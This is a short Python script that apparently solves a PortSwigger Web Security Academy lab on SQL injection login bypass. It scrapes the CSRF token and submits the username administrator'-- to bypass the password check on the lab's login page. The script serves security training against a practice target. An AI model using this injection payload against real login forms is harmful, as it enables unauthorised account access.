#https://portswigger.net/web-security/sql-injection/lab-login-bypass
from utils import *

url='https://0a4c0039032765fe837b4b7200b70014.web-security-academy.net/login'

session=requests.Session()
response=session.get(url)
soup=parse_html(response)

#getting the csrf token
token=soup.find('input')['value']
print(token)


payload={
    'password':"qsdqsd",
    'csrf':token,
    'username':"administrator'--",
}

response=session.post(url,data=payload)

soup=parse_html(response)

print(check_succes(soup))


